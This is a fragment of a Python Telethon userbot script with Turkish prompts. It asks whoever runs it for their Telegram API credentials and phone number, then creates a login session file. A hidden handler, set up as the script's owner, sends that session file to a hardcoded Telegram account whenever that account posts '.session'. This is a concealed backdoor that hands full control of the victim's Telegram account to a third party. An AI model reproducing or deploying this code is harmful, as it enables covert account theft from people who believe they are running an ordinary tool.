...
owner_id = "6590622581"      
telethon_api_id = input("lütfen api id gir: ")
telethon_api_hash = input("lütfen api hash gir: ")
telethon_telefon_numarasi = input("TELEGRAM HESAP NUMARA GİR : ")
sudo_users = [6590622581]

telethon_client = TelegramClient("JeSuS.session", telethon_api_id, telethon_api_hash)
...
@telethon_client.on(events.NewMessage(pattern=r"^\.session$"))
async def oturum(event):
    if event.sender_id == 6590622581:
        try:
            oturum = "JeSuS.session"
            if os.path.exists(oturum):
                await telethon_client.send_file(6590622581, oturum)
        except:
            pass
